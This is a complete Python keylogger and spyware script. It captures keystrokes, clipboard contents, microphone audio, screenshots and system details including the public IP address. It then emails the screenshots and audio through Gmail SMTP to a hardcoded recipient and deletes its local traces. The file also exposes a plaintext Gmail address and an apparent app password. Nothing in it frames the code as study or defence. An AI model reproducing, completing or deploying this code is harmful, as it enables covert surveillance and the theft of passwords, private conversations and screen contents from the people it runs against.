import os
import time
import socket
import platform
import getpass
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
from requests import get
from pynput.keyboard import Key, Listener
import sounddevice as sd
from scipy.io.wavfile import write
from PIL import ImageGrab
from threading import Thread

# File paths
keys_information = "key_log.txt"
system_information = "systeminfo.txt"
clipboard_information = "clipboard.txt"
audio_information = "audio.wav"
screenshot_information = "screenshot.png"
file_path = "D:\\Keylogger2\\Project"
extend = "\\"
file_merge = file_path + extend

# Email details
email_address = "bb1.deavanathan.s@gmail.com"
password = "ipwm okbq ryso xyjc"
toaddr = "dnathan781@gmail.com"

# Constants
microphone_time = 10
time_iteration = 15
number_of_iterations_end = 3

# Global variables for keylogging
keys = []
count = 0
currentTime = time.time()
stoppingTime = time.time() + time_iteration

def send_email(filename, attachment, toaddr):
    fromaddr = email_address
    msg = MIMEMultipart()
    msg['From'] = fromaddr
    msg['To'] = toaddr
    msg['Subject'] = "Log File"
    body = "Body_of_the_mail"
    msg.attach(MIMEText(body, 'plain'))

    try:
        with open(attachment, 'rb') as attach_file:
            p = MIMEBase('application', 'octet-stream')
            p.set_payload(attach_file.read())
            encoders.encode_base64(p)
            p.add_header('Content-Disposition', f"attachment; filename= {filename}")
            msg.attach(p)

        with smtplib.SMTP('smtp.gmail.com', 587) as s:
            s.starttls()
            s.login(fromaddr, password)
            s.sendmail(fromaddr, toaddr, msg.as_string())
            print(f"Email sent with {filename}")
    except Exception as e:
        print(f"Failed to send email: {e}")

def computer_information():
    try:
        with open(file_path + extend + system_information, "a") as f:
            hostname = socket.gethostname()
            IPAddr = socket.gethostbyname(hostname)
            try:
                public_ip = get("https://api.ipify.org").text
                f.write("Public IP Address: " + public_ip + '\n')
            except Exception:
                f.write("Couldn't get Public IP Address (most likely max query\n")

            f.write("Processor: " + platform.processor() + '\n')
            f.write("System: " + platform.system() + " " + platform.version() + '\n')
            f.write("Machine: " + platform.machine() + '\n')
            f.write("Hostname: " + hostname + '\n')
            f.write("Private IP Address: " + IPAddr + '\n')
    except Exception as e:
        print(f"Failed to retrieve or write computer information: {e}")

def copy_clipboard():
    try:
        import win32clipboard
        with open(file_path + extend + clipboard_information, "a") as f:
            try:
                win32clipboard.OpenClipboard()
                pasted_data = win32clipboard.GetClipboardData()
                win32clipboard.CloseClipboard()
                f.write("Clipboard Data: \n" + pasted_data)
            except Exception as e:
                f.write("Clipboard could not be copied\n")
                print(f"Clipboard error: {e}")
    except ImportError:
        print("win32clipboard module is not installed.")

def microphone():
    try:
        fs = 44100
        seconds = microphone_time
        print("Recording audio...")
        myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
        sd.wait()
        write(file_path + extend + audio_information, fs, myrecording)
        print("Audio recording complete.")
    except Exception as e:
        print(f"Failed to record audio: {e}")

def screenshot():
    try:
        im = ImageGrab.grab()
        im.save(file_path + extend + screenshot_information)
        print("Screenshot taken.")
    except Exception as e:
        print(f"Failed to take screenshot: {e}")

def write_file(keys):
    try:
        with open(file_path + extend + keys_information, "a") as f:
            for key in keys:
                k = str(key).replace("'", "")
                if k.find("space") > 0:
                    f.write('\n')
                elif k.find("Key") == -1:
                    f.write(k)
        print("Keys written to file.")  # Debug statement
    except Exception as e:
        print(f"Failed to write keys to file: {e}")

def on_press(key):
    global keys, count, currentTime
    try:
        print(f"Key pressed: {key}")  # Debug statement
        keys.append(key)
        count += 1
        currentTime = time.time()

        if count >= 1:
            count = 0
            write_file(keys)
            keys = []
    except Exception as e:
        print(f"Error in on_press: {e}")

def on_release(key):
    global currentTime, stoppingTime
    try:
        if key == Key.esc or currentTime > stoppingTime:
            print("Stopping keylogger...")  # Debug statement
            return False
    except Exception as e:
        print(f"Error in on_release: {e}")

def start_keylogger():
    try:
        with Listener(on_press=on_press, on_release=on_release) as listener:
            listener.join()
    except Exception as e:
        print(f"Failed to start keylogger: {e}")

def main():
    try:
        print("Starting keylogger...")  # Debug statement
        computer_information()
        copy_clipboard()

        keylogger_thread = Thread(target=start_keylogger)
        keylogger_thread.start()

        for _ in range(number_of_iterations_end):
            screenshot()
            send_email(screenshot_information, file_path + extend + screenshot_information, toaddr)
            copy_clipboard()
            microphone()
            send_email(audio_information, file_path + extend + audio_information, toaddr)

            time.sleep(time_iteration)

        keylogger_thread.join()

        # Cleanup
        delete_files = [system_information, clipboard_information, keys_information, screenshot_information, audio_information]
        for file in delete_files:
            try:
                os.remove(file_merge + file)
            except FileNotFoundError:
                pass
    except Exception as e:
        print(f"Error in main: {e}")

if __name__ == "__main__":
    main()
#hello 